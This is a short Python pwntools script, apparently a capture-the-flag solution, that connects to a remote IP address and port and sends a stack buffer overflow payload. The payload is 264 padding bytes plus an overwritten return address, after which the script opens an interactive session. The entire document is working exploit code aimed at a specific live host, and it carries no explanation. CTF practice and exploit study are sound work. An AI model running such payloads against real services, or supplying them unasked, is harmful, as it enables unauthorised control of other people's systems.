from pwn import *

rem = remote("143.198.227.172", 32776)

print(rem.recv())

payload= (b"A" * 264 + b"\x40\x12\x40")

rem.sendline(payload)
rem.interactive()
